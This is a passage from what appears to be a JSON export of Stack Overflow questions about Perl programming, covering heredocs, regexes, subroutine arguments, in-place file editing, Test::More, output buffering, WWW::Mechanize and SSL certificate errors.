work?</p>\n\n<p>Thanks,</p>\n\n<p>Fred.</p>\n"},{"tags":["ruby","perl","include","extend","emulation"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":148,"score":2,"question_id":10060939,"title":"Perl: How to emulate Ruby's \"include/extend\" mechanism?","body":"<p>How I can emulate in my Perl code things like Ruby's \"include\"/\"extend\" mechanism?</p>\n\n<p>Let's take for example the following code in Ruby:</p>\n\n<pre><code>module ActiveRecord\n  class Base\n\n    class &lt;&lt; self\n      #...\n    end\n\n    #...\n  end\n\n  Base.class_eval do\n    include ActiveRecord::Persistence\n    extend ActiveModel::Naming\n    extend QueryCache::ClassMethods\n    extend ActiveSupport::Benchmarkable\n    extend ActiveSupport::DescendantsTracker\n\n    include ActiveModel::Conversion\n    include Validations\n    extend CounterCache\n    include Locking::Optimistic, Locking::Pessimistic\n    include AttributeMethods\n    ...\n  end\nend\n</code></pre>\n\n<p>It leads me to ask this question, because I can't find any clear idea during several days of researching. So, maybe there exists some good way to organize it in Perl?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":71,"score":-1,"question_id":12975615,"title":"Perl how to use variable in a string block with << Parameter","body":"<p>I try to use a variable i inside the <code>&lt;&lt;</code> block. But it fails because of the compilation errors</p>\n\n<blockquote>\n  <p>Global symbol \"$i_0\" requires explicit package name at\n  D:/development/perl/SupportCases/createFTL.pl line 76.<br>\n  Global symbol \"$i_0\" requires explicit package name at\n  D:/development/perl/SupportCases/createFTL.pl line 76.<br>\n  Global symbol \"$i_1\" requires explicit package name at\n  D:/development/perl/SupportCases/createFTL.pl line 76.<br>\n  Global symbol \"$i_1\" requires explicit package name at\n  D:/development/perl/SupportCases/createFTL.pl line 76.<br>\n  Global symbol \"$i_2\" requires explicit package name at\n  D:/development/perl/SupportCases/createFTL.pl line 76.<br>\n  Global symbol \"$i_2\" requires explicit package name at\n  D:/development/perl/SupportCases/createFTL.pl line 76.<br>\n  Global symbol \"$i_0\" requires explicit package name at\n  D:/development/perl/SupportCases/createFTL.pl line 76.<br>\n  Global symbol \"$i_1\" requires explicit package name at\n  D:/development/perl/SupportCases/createFTL.pl line 76.<br>\n  Global symbol \"$i_2\" requires explicit package name at\n  D:/development/perl/SupportCases/createFTL.pl line 76.</p>\n</blockquote>\n\n<p>How do I have to define the variables inside the &lt;&lt; block? </p>\n\n<p>Thanks</p>\n\n<pre><code>my $i = 1;\nfor ($i = 1; $i &lt;=6; $i++){\n\nmy $block = &lt;&lt;BLOCK;\n    &lt;#if ((model.fields.txt_Artikel_Z$i?? || model.fields.txt_Artikel_Z$i.value = \"\") &amp;&amp; \n                (model.fields.txt_Artikelnummer_Z$i?? || model.fields.txt_Artikelnummer_Z$i.value = \"\") &amp;&amp;\n                    (model.fields.txt_Anzahl_Z$i?? || model.fields.txt_Anzahl_Z$i.value = \"\") &amp;&amp;\n                        (model.fields.chk_Ware_aus_Z$i_0?? || model.fields.chk_Ware_aus_Z$i_0.value = \"\") &amp;&amp;\n                            (model.fields.chk_Ware_aus_Z$i_1?? || model.fields.chk_Ware_aus_Z$i_1.value = \"\")&amp;&amp;\n                                (model.fields.chk_Ware_aus_Z$i_2?? || model.fields.chk_Ware_aus_Z$i_2.value = \"\")) \n                                &amp;&amp;\n                        (!(model.fields.txt_Artikel_Z$i.value = \"\") &amp;&amp; \n                                !(model.fields.txt_Artikelnummer_Z$i.value = \"\") &amp;&amp;\n                                    !(model.fields.txt_Anzahl_Z$i.value = \"\") &amp;&amp;\n                                        !(model.fields.chk_Ware_aus_Z$i_0.value = \"\") &amp;&amp;\n                                            !(model.fields.chk_Ware_aus_Z$i_1.value = \"\")&amp;&amp;\n                                                !(model.fields.chk_Ware_aus_Z$i_2.value = \"\"))                                                                                              \n        &gt;\n        &lt;#else&gt;\n            &lt;result type=\"ERROR\" \n                field=\"txt_Fehlerbericht_Arbeiten_Z$i\"\n                code=\"-1\" \n                message=\"Komplette Zeile $i muss ausgefÃ¼llt sein!\" /&gt;\n\n        &lt;/#if&gt;\nBLOCK\n\nprint \"$block\";\n\n}\n</code></pre>\n"},{"tags":["ruby","regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12963626,"title":"Regex: extract CSS styles from CSS file","body":"<p>I have a big CSS file with all CSS we need for our internal framework, but I only need a few of the styles. So I want to extract the style I want. I used regular expression to extract them:</p>\n\n<pre><code>cssFileContent.scan(/\\.#{cssName}.*?\\{.+?\\}/im)\n</code></pre>\n\n<p>In Ruby, <code>scan</code> means extract the patter from string, <code>cssName is</code> the CSS style name\ni - case insensitive\nm - dot match everything so that \\n will be matched too</p>\n\n<p>It gives me some style blocks, but skip one every time. For example, I have <code>.abc-style { }</code> and <code>.def-style { }</code>, but result is like:</p>\n\n<pre><code>.abc-style {\n\n}\n\n}\n</code></pre>\n\n<p>so def-style is skipped.</p>\n\n<p>Can someone give me any point why? And how to correct?</p>\n"},{"tags":["perl","filenames","sanitization"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":75,"score":0,"question_id":12973829,"title":"who interpretes Perl filename checks?","body":"<p>The code 'if(-e \"filename\")' tests for existence of a file with name filename in the directory the script containing that code is executed in.</p>\n\n<p><strong>Who does the name check?</strong> Perl? The os? bash on POSIX-os?</p>\n\n<p>Would 'if(-e \"cat string\")' execute the cat command on Linux?</p>\n\n<p><br />\nI want to know in order to be able to avert undesired file access like \"../file\" would access a file in the parent directory.</p>\n\n<p><br />\nTo share my check code:</p>\n\n<pre><code>if($folder =~ m/$([\\\\]?\\.[\\\\]?\\.|[\\\\]?\\\\|[\\\\]?\\/|[\\\\]?\\?|[\\\\]?*|[\\\\]?:|[\\\\]?\\||[\\\\]?\\\"|[\\\\]?\\&lt;|[\\\\]?\\&gt;)^|$([\\\\]?\\.[\\\\]?\\.|[\\\\]?\\\\|[\\\\]?\\/|[\\\\]?\\?|[\\\\]?*|[\\\\]?:|[\\\\]?\\||[\\\\]?\\\"|[\\\\]?\\&lt;|[\\\\]?\\&gt;)\\/|\\/([\\\\]?\\.[\\\\]?\\.|[\\\\]?\\\\|[\\\\]?\\/|[\\\\]?\\?|[\\\\]?*|[\\\\]?:|[\\\\]?\\||[\\\\]?\\\"|[\\\\]?\\&lt;|[\\\\]?\\&gt;)\\/|\\/([\\\\]?\\.[\\\\]?\\.|[\\\\]?\\\\|[\\\\]?\\/|[\\\\]?\\?|[\\\\]?*|[\\\\]?:|[\\\\]?\\||[\\\\]?\\\"|[\\\\]?\\&lt;|[\\\\]?\\&gt;)^|\\$'[^']*'/)\n{\n    #error\n}\n</code></pre>\n\n<p><br />\nUpdated re:</p>\n\n<pre><code>if($folder =~ m/(\\/|\\\\)|$([\\\\]?\\.[\\\\]?\\.^|$[\\\\]?(\\*|\\?)^|\\$'[^']*'/)\n{\n    #error\n}\n</code></pre>\n\n<p>Explanation: $folder shall be a pure filename already. If it contains Windows or POSIX path separators or is (any escaped) parent directory back link or is (any escaped) wild card (as that matches the first matching file and returns true on Mac OS X at least) or contains a C ANSI escape sequence anywhere, signal error. Anything else, even if not legal or if shady, should simply return a \"file not exists\" and thus may be supplied to an 'if(-e $folder)'.</p>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":87,"score":0,"question_id":12969621,"title":"Passing variables through functions","body":"<p>When I pass a variable through a couple of subs, it always turns up empty. Why is this ?</p>\n\n<pre><code>sub Main {\n\n    my $myVariable = \"Test string\";\n    firstSub($myVariable);\n}\n\n\nsub firstSub {\n\n    my($myVariable) = @_;\n    my @array = `some command`;\n    secondSub(@array, $myVariable);\n}\n\nsub secondSub {\n\n    my(@array, $myVariable) = @_;\n    print $myVariable; \n}\n</code></pre>\n\n<p>echo will be undef.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":58,"score":-2,"question_id":12968712,"title":"Concatenating strings to a path","body":"<p>I'm having some trouble with concatenation on strings. I'm tring to create a path that will become a .txt file, but it always ends up as just \".txt\" with no name. It ends up in the right fikder though.</p>\n\n<p>This is what I'm doing:</p>\n\n<pre><code>open TEXT, \"&gt;/home/admin/www/build/logs/baseline\".$ID.\"/\".$platformName.\".txt\" or die $!;\n</code></pre>\n\n<p>So I want to create the file.\n    \"/home/admin/www/build/logs/baseline45/linux.txt\"</p>\n\n<p>Where am I messing this up?</p>\n\n<p>Thanks!</p>\n"},{"tags":["java","c","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":99,"score":1,"question_id":12971777,"title":"how to execute the content given to a variable dynamically","body":"<p>I have one program which takes a set of statements into a variable,\nand how can i place that block of code(which is given into a variable as string) dynamically into present executing code for compilation and execution.\ni am eagerly waiting for this solution.\nany programming language having this facility..\nif yes please paste the code for this question</p>\n"},{"tags":["perl","inplace-editing"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":545,"score":3,"question_id":4879848,"title":"Read entire file then print when editing inplace?","body":"<p>Most examples of inplace editing are one-liners that iterate through a file or files, reading and printing one line at a time.</p>\n\n<p>I can't find any examples of reading an entire file into an array, modifying the array as needed, and then printing the array while using the ^I switch to do an inplace edit. When I try to read the entire file from the diamond operator, edit the contents and print the entire contents, I find that the print goes to STDOUT instead of ARGVOUT and that ARGVOUT is closed. I can open the same file for output and then print to it, but I'm not sure I understand why that is necessary. Here is an example:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse 5.010;\n\nmy $filename = 'test.txt';\n\npush @ARGV, $filename;\n\n$^I = \".bk\";\n\nmy @file = &lt;&gt;; #Read all records into array\nchomp @file;\npush @file, qw(add a few more lines);\n\nprint join \"\\n\", @file; #This prints to STDOUT, and ARGVOUT is closed. Why?\n</code></pre>\n\n<p>Running the above makes a backup of the test.txt file as expected, but leaves the edited test.txt empty, printing the edited contents to STDOUT instead.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":138,"score":1,"question_id":12928304,"title":"Perl Hash Script","body":"<p>My question in Perl is like this:</p>\n\n<p>Read a series of employee numbers and daily working hours from standard input, one set perl line.The employee number and the hours worked should be separated by a space. Use hashes and calculate the total number of hours worked and the average number of hours per work period. Print out a report by sorted employee number, the number of work periods, the total hours worked, and the average  number of hours per work period. Assume that some of the employees are on a part-time schedule and do not work the same number of days or hours as regular employees.</p>\n\n<p>My script is:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nmy @series = qw(41234 9 67845 8 32543 10 84395 7 57543 9 23545 11);\nmy $workper = 3;\nmy %empwork;\n\nwhile (my $series = shift @series) {\n\n    my $nums = shift @series;\n    $empwork{$series} += $nums;\n}\n\nmy $tot;\nforeach (sort keys %empwork) {\n\n    $tot += $empwork{$_};\n}\n\nmy $avg = $tot/$workper;\nprint \"Sorted Employee Numbers:\\n\";\nforeach my $empnum(sort keys %empwork) {\n\n    print \"$empnum\\n\";\n}\nprint \"The number of work periods is $workper\\n\";\nprint \"Total number of hours is $tot\\n\";\nprint \"Average number of hours per work period is $avg\\n\";\n</code></pre>\n\n<p>My Output is:</p>\n\n<pre><code>Sorted Employee Numbers:\n23545\n32543\n41234\n57543\n67845\n84395\nThe number of work periods is 3\nTotal number of hours is 54\nAverage number of hours per work period is 18\n</code></pre>\n\n<p>Can anyone please tell me whether I have done anything wrong in the script. If yes, please help. Thanks in advance.</p>\n\n<p>If I use loop through %empwork once like this:</p>\n\n<pre><code>foreach my $empnum(sort keys %empwork) {\n\n    $tot += $empwork{$_};\n    print \"$empnum\\n\";\n}\n</code></pre>\n\n<p>Then I will get the output as:</p>\n\n<pre><code>Sorted Employee Numbers:\n23545\n32543\n41234\n57543\n67845\n84395\nThe number of work periods is 3\nTotal number of hours is 0\nAverage number of hours per work period is 0\nUse of uninitialized value in hash element at /tmp/135043087931085.pl line 16.\nUse of uninitialized value in addition (+) at /tmp/135043087931085.pl line 16.\nUse of uninitialized value in hash element at /tmp/135043087931085.pl line 16.\nUse of uninitialized value in addition (+) at /tmp/135043087931085.pl line 16.\nUse of uninitialized value in hash element at /tmp/135043087931085.pl line 16.\nUse of uninitialized value in addition (+) at /tmp/135043087931085.pl line 16.\nUse of uninitialized value in hash element at /tmp/135043087931085.pl line 16.\nUse of uninitialized value in addition (+) at /tmp/135043087931085.pl line 16.\nUse of uninitialized value in hash element at /tmp/135043087931085.pl line 16.\nUse of uninitialized value in addition (+) at /tmp/135043087931085.pl line 16.\nUse of uninitialized value in hash element at /tmp/135043087931085.pl line 16.\nUse of uninitialized value in addition (+) at /tmp/135043087931085.pl line 16.\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":129,"score":1,"question_id":12970072,"title":"Perl Fahrenheit to Celsius conversion and vice-versa","body":"<p>I have the question in Perl:\nTo write a Perl script which will ask the user for a temperature and then ask whether it is to be converted to degree Celius or Fahrenheit. Perform the conversion and display the answer. The equations for temperature conversion are:</p>\n\n<pre><code>1) Celsius to Fahrenheit:C=(F-32) x 5/9\n2) Fahrenheit to Celsius:F=9C/5 + 32\n</code></pre>\n\n<p>My script is:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nprint \"Enter the temperature: \";\nmy $temp = &lt;STDIN&gt;;\nprint \"Enter the Conversion to be performed:\";\nmy $conv = &lt;STDIN&gt;;\nmy $cel;\nmy $fah;\n\nif ($conv eq 'F-C') {\n\n   $cel = ($temp - 32) * 5/9;\n   print \"Temperature from $fah degree Fahrenheit is $cel degree Celsius\";\n}\n\nif ($conv eq 'C-F') {\n\n    $fah = (9 * $temp/5) + 32;\n    print \"Temperature from $cel degree Celsius is $fah degree Fahrenheit\"; \n}\n</code></pre>\n\n<p>After I enter $temp and $conv from the keyboard, blank output will appear.Where am I going wrong? Please help. Thanks in advance.</p>\n"},{"tags":["perl","ssl","ssl-certificate"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12970457,"title":"Does Net::SSLeay verify peer certificates by default?","body":"<p>From Net::SSLeay man page:</p>\n\n<blockquote>\n  <p>OpenSSL supports the ability to verify peer certificates. It can also\n  optionally check the peer certificate against a Certificate Revocation\n  List (CRL) from the certificates issuer.</p>\n</blockquote>\n\n<p>Question: Does Net::SSLeay verify peer certificates by default (when no CRLs are loaded)?</p>\n\n<p>I am writing a PayPal Instant Payment Notification accepting CGI script and want to be sure that the IP of PayPal is not spoofed.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12965240,"title":"Filter all mail generated by a Perl script","body":"<p>Is it possible to filter all outgoing mail generated by Perl scripts, or remove the ability for Perl to send mail all together?  </p>\n\n<p>I've accomplished something similar with PHP as noted in \n<a href=\"http://serverfault.com/questions/250325/log-all-outgoing-mail-created-by-php\">Log all outgoing mail created by php</a>. This is just a wrapper around sendmail, but works very well.</p>\n\n<p>My system is Ubuntu 10.04 LTS with Postfix and Perl v5.10.1</p>\n"},{"tags":["regex","perl","syntax"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":116,"score":3,"question_id":12950054,"title":"Difference between Perl regular expression delimiters /.../ and #...#","body":"<p>Today I came across two different syntaxes for a Perl regular expression match.</p>\n\n<pre><code>#I have a date string\nmy $time = '2012-10-29';\n\n#Already familiar \"m//\":\n$t =~ m/^(\\d{4}-\\d\\d-\\d\\d)$/\n\n#Completely new to me m##.\n$t =~ m#^(\\d{4}-\\d\\d-\\d\\d)#/\n</code></pre>\n\n<p>Now what is the difference between <code>/expression/</code> and <code>#expression#</code>?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12968900,"title":"Pass by reference in perl","body":"<pre><code>use warnings;\nuse strict;\n\nmy @array = (1,2,3,4,5);\nmy $v = 1;\n\nsub by_ref \n{\n    my ($array_ref,$v) = @_;  \n    @$array_ref = (0,0,0);\n    print \"Array inside by_ref: @$array_ref\\n\"; \n}\n\nby_ref(\\@array,$v);\nprint \"Array changed: @$array\\n\";\n</code></pre>\n\n<p>I'm passing <code>@array</code> by reference(I'm assuming I'm doing it right). I want the changes made in the sub routine on <code>@array</code>be reflected in the calling sub routine. I don't know where I have gone wrong. \nThank you in advance.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":69,"score":-4,"question_id":12888729,"title":"Reading the contents of directories in Perl","body":"<p>I am trying to accomplish two things with a Perl script. I have a file, which in the first subdirectory has different user directories, and in each of these user directories contains some folders that have text files in them. I am trying to write a Perl script that</p>\n\n<ol>\n<li>Lists the directories for each user</li>\n<li>Gets the total number of <code>.txt</code> files</li>\n</ol>\n\n<p>For the second objective I have this code</p>\n\n<pre><code>my @emails = glob \"$dir/*.txt\";\nfor (0..$#emails){\n    $emails[$_] =~ s/\\.txt$//;\n}\n$emails=@emails;\n</code></pre>\n\n<p>but <code>$emails</code> is returning 0. Any insight?</p>\n"},{"tags":["perl","testing","module"],"answer_count":3,"favorite_count":0,"up_vote_count":9,"down_vote_count":0,"view_count":120,"score":9,"question_id":12965559,"title":"Testing Perl module with Test::More (Intermediate Perl, chapter 14)","body":"<p>This is my first question to Stack Overflow.  Apologies in advance if I am breaking some rules.</p>\n\n<p>I have been reading Chapter 14 of Intermediate Perl, 2nd ed., which discusses testing Perl modules and using features from Test::More.  I am referring to code published directly in this book in the Section titled \"Adding Our First Tests\".</p>\n\n<p>For some background, in this chapter, a sample <code>Animal</code> class is created in a module with the same name.  This class has a simple <code>speak</code> method which looks like this:</p>\n\n<pre><code>sub speak {\n    my $class = shift;\n    print \"a $class goes \", $class-&gt;sound, \"!\\n\";\n}\n</code></pre>\n\n<p>The <code>sound</code> method is a simple string returned for an particular Animal, so for example, a Horse's <code>sound</code> method will be simply <code>sub sound { \"neigh\" }</code> and it's <code>speak</code> method should output the following:</p>\n\n<pre><code>A Horse goes neigh!\n</code></pre>\n\n<p>The problem I'm running into is the following:  in the testing code I've created at ./Animal/t/Animal.t , I am instructed to use bare blocks and <code>Test::More::is</code> to test that the <code>speak</code> method is working.  The code looks like this in the test file:</p>\n\n<pre><code>[test code snip]\n{\n    package Foofle;\n    use parent qw(Animal);\n\n    sub sound { 'foof' }\n    is( Foofle-&gt;speak, \n        \"A Foofle goes foof!\\n\", \n        \"An Animal subclass does the right thing\"\n    );\n}\n</code></pre>\n\n<p>The test fails.  I ran all the Build commands, but when running \"Build test\", I get this failure for the Animal test:</p>\n\n<pre><code>Undefined subroutine &amp;Foofle::is called at t/Animal.t line 28.\n</code></pre>\n\n<p>When I try to explicitly use <code>Test::More::is</code> instead of just plain <code>is</code>, the test still fails with the following message:</p>\n\n<pre><code>#   Failed test 'An Animal subclass does the right thing'\n#   at t/Animal.t line 28.\n#          got: '1'\n#     expected: 'A Foofle goes foof!\n# '\n</code></pre>\n\n<p>My methods appear to be defined exactly as I explained.  I think the first error is a scope issue because of the bare blocks, but not 100% sure.  The second error I am unsure about, because if I were to create a <code>Foofle</code> class as a child of <code>Animal</code> and called <code>speak</code> on it, I would not get a 1 response, but rather the expected output.</p>\n\n<p>Would someone be able to help out on what I may be doing wrong?  For perhaps relevant software versions, I am using perl v5.16, Test::More v0.98, and Module::Starter v1.58.</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":156,"score":6,"question_id":12949997,"title":"How to catch roman numbers inside string?","body":"<p>I want to catch roman numbers inside string (numbers below 80 is fine enough). I found good base for it in <a href=\"http://stackoverflow.com/questions/267399/how-do-you-match-only-valid-roman-numerals-with-a-regular-expression\">How do you match only valid roman numerals with a regular expression?</a>. Problem is: it deals with whole strings. I did not found yet a solution how to detect roman numbers inside string, because there is nothing mandatory, every group may be optional. So far i tried something like this:</p>\n\n<pre><code>my $x = ' some text I-LXIII iv more ';\n\nif (  $x =~  s/\\b(\n                    (\n                        (XC|XL|L?X{0,3}) # first group 10-90\n                    |\n                        (IX|IV|V?I{0,3}) # second group 1-9\n                    )+\n            )\n        \\b/&gt;$1&lt;/xgi ) { # mark every occurrence\n    say $x;\n}\n\n__END__\n &gt;&lt;some&gt;&lt; &gt;&lt;text&gt;&lt; &gt;&lt;&gt;I&lt;&gt;&lt;-&gt;&lt;&gt;LXIII&lt;&gt;&lt; &gt;&lt;&gt;iv&lt;&gt;&lt; &gt;&lt;more&gt;&lt; \n desired output:\n  some text &gt;I&lt;-&gt;LXIII&lt; &gt;iv&lt; more \n</code></pre>\n\n<p>So, this one captures word boundaries by themself too, because all groups are optional. How to get it done? How to make one of those 2 groups mandatory while there is no possible to tell which one is mandatory? Other approaches to catch romans are welcome too.</p>\n"},{"tags":["perl","executable","www-mechanize"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":60,"score":0,"question_id":12965208,"title":"www::mechanize perl, executable","body":"<p>I read a question you asked about 5months ago on stackoverflow.com more precisly here it is:\n<a href=\"http://stackoverflow.com/questions/10634444/using-wwwmechanize-to-navigate-forms-on-amazon-site\">Using WWW::Mechanize to navigate forms on Amazon site</a></p>\n\n<p>I am creating a script that enters a site and enters my credentials, to finally save the sites source code so I can parse the information.</p>\n\n<p>I have a problem, my script works totally fine when used as a .pl script or on eclipse. But once I package it into a .exe it does not function. I noticed that it is related to my site type, more precisely any sites needing credentials i cannot package them into an functioning executable. \nWould you by any chance have an idea what the problem might be?</p>\n\n<p>thank you very much!</p>\n\n<p>here is my code:</p>\n\n<pre><code>#!/usr/local/bin/perl\n\nuse Spreadsheet::WriteExcel;\nuse WWW::Mechanize;\n\nuse Win32::Registry;\nuse LWP::Protocol::https;\nuse LWP;\nuse HTTP::Cookies;\nuse HTTP::Server::Simple;\nuse Net::HTTP;\nuse Pod::Usage;\nuse HTTP::Status;\nuse HTML::Form;\nuse Bundle::WWW::Mechanize::Shell;\n\n# kills cmd prompt when .exe used on win32\nBEGIN {\n  if ($^O eq 'MSWin32') {\n    require Win32::Console;\n    Win32::Console::Free( );\n  }\n}\n\n# Create a new instance of Mechanize\nmy $bot = WWW::Mechanize-&gt;new();\n\n$bot-&gt;agent_alias( 'Windows Mozilla' );\n\n\n# Connect to the login page\nmy $response = $bot-&gt;get('https://siteWithCredentials.com/' );\ndie \"GET failed url\" unless $response-&gt;is_success;\n\n# Get the login form. You might need to change the number.\n$bot-&gt;form_number(3);\n\n# Enter the login credentials.\n$bot-&gt;field( username =&gt; 'a username' );\n$bot-&gt;field( password =&gt; 'a password' );\n$response = $bot-&gt;click();\n\n$bot-&gt;get('http://sitewithCredentials/directoryIamParsing.html' );\nmy $content = $bot-&gt;content();\n\nmy $outfile = \"out.txt\";\nopen(OUTFILE, \"&gt;$outfile\");\nprint OUTFILE  $content;\nclose(OUTFILE);\n\nopen(FILE,$outfile);\nmy @releasesAU;\nmy @releasesAU3G;\n\n\nwhile (&lt;FILE&gt;) {\n    chomp;\n    my $lineDATA = $_;\n        if(index($lineDATA, \"HN+_US_AU3G\") != -1){\n\n            if( $lineDATA =~ /\"&gt;([_+\\w]*)&lt;\\/a&gt;/){\n                print $1, \"\\n\";\n                push(@releasesAU3G,$1);\n            }\n        }\n\n        if(index($lineDATA, \"HN+R_US_AU\") != -1){\n\n            if( $lineDATA =~ /\"&gt;([_+\\w]*)&lt;\\/a&gt;/){\n                print $1, \"\\n\";\n                push(@releasesAU,$1);\n            }\n        }   \n}\nclose(FILE);\n\nmy $row = 0;\nmy $col=0;\nmy $workbook = Spreadsheet::WriteExcel-&gt;new(\"test.xls\");\nmy $worksheet = $workbook-&gt;add_worksheet();\n$worksheet-&gt;write($row,  $col, \"Releases HN+R_US_AU3G\");\n$worksheet-&gt;write($row,  $col+1, \"Releases HN+R_US_AU3G\");\n$row=2;\n\nforeach my $SOP (@releasesAU){\n    $worksheet-&gt;write($row,   $col, $SOP);\n    $row = $row+1;\n}\n$row =2;\n\nforeach my $SOP (@releasesAU3G){\n    $worksheet-&gt;write($row,   $col+1, $SOP);\n    $row = $row+1;\n}   \n\n$workbook-&gt;close();\n</code></pre>\n"},{"tags":["perl","io"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":74,"score":2,"question_id":12967040,"title":"Perl Strange Buffered Output Behavior","body":"<p>I've recently been trying to teach myself Perl and have been doing some basic exercises. In one of them, you have a hard-coded hash of last names to first names. The user inputs a last name and you output the first name -- relatively straightforward. The code is as follows:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse strict;\nuse warnings;\n\nmy %first_name = (\n    Doe =&gt; 'John',\n    Johnson =&gt; 'Bob',\n    Pitt =&gt; 'Brad',\n);\n\nprint \"What is your last name?\\n\";\nchomp (my $last_name = &lt;STDIN&gt;);\nprint \"Your first name is $first_name{$last_name}.\\n\";\n</code></pre>\n\n<p>Now, something strange happens. The <strong>\"What is your last name?\\n\"</strong> line is not displayed until I input something to the program (and press Enter), after which, the following is printed:</p>\n\n<pre><code>What is your last name?\nYour first name is .\nUse of uninitialized value within %first_name in concatenation (.) or string at     test.pl line 14, &lt;STDIN&gt; line 1.\n</code></pre>\n\n<p>Now, I understand the notion of buffered output and all that, and, if I add <code>$| = 1</code> at the beginning of my program, it works. However, my expectation would be that even without that line, even though <code>print</code> statement strings might not print immediately, my input string will still be placed in the <code>$last_name</code> variable, which it is not. So, I have two questions regarding this:</p>\n\n<ol>\n<li>Why is this happening? Is it an OS thing (I'm running on Windows)?</li>\n<li>Why is it that adding a <code>\\n</code> does not flush the output (as various sources say it does)?</li>\n</ol>\n\n<p><strong>Note:</strong> If I replace the last line that accesses the <code>%first_name</code> hash with a simple printing of the <code>$last_name</code> variable, then, even though the output is still \"delayed\", the variable has the correct value.</p>\n\n<p><strong>Note #2</strong>: Alternatively, if the code after printing the last name is replaced with this,</p>\n\n<pre><code>if (exists $first_name{$last_name}){ \n   print \"Your first name is $first_name{$last_name}.\\n\";\n}\n\nelse{\n    print \"Last name is not in hash.\\n\";\n}\n</code></pre>\n\n<p>then <code>$last_name</code> does get assigned the correct value from <code>&lt;STDIN&gt;</code>. I am not sure what to make of this.</p>\n"},{"tags":["perl","ssl","amazon-web-services","lwp","amazon-ses"],"answer_count":3,"favorite_count":4,"up_vote_count":1,"down_vote_count":0,"view_count":3081,"score":1,"question_id":5639803,"title":"AWS SES certificate verify failed","body":"<p>I have set up SES successfully on one AWS instance. Now I am trying to use it on a second (not cloned) instance and when I run any of the SES scripts, I get an error:</p>\n\n<pre><code>ses-get-stats.pl -k aws-credentials -q\n</code></pre>\n\n<p>I get:</p>\n\n<blockquote>\n  <p>Can't connect to email.us-east-1.amazonaws.com:443 (certificate verify failed)  LWP::Protocol::https::Socket: SSL connect attempt failed with unknown  errorerror:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed at /usr/local/share/perl/5.8.8/LWP/Protocol/http.pm line 51.</p>\n</blockquote>\n\n<p>Getting the Perl stuff working was a challenge and it is possible I did it differently on the instance. Any place I should be looking to fix this?</p>\n\n<p>When I run:</p>\n\n<pre><code>openssl s_client -CAfile .../cacert.pem -connect email.us-east-1.amazonaws.com:443 &lt; /dev/null\n</code></pre>\n\n<p>I get:</p>\n\n<pre><code>CONNECTED(00000003)\ndepth=1 /C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https://www.verisign.com/rpa (c)09/CN=VeriSign Class 3 Secure Server CA - G2\nverify error:num=20:unable to get local issuer certificate\nverify return:0\n---\nCertificate chain\n 0 s:/C=US/ST=Washington/L=Seattle/O=Amazon.com Inc./CN=email.us-east-1.amazonaws.com\n   i:/C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https://www.verisign.com/rpa (c)09/CN=VeriSign Class 3 Secure Server CA - G2\n 1 s:/C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https://www.verisign.com/rpa (c)09/CN=VeriSign Class 3 Secure Server CA - G2\n   i:/C=US/O=VeriSign, Inc./OU=Class 3 Public Primary Certification Authority - G2/OU=(c) 1998 VeriSign, Inc. - For authorized use only/OU=VeriSign Trust Network\n---\nServer certificate\n-----BEGIN 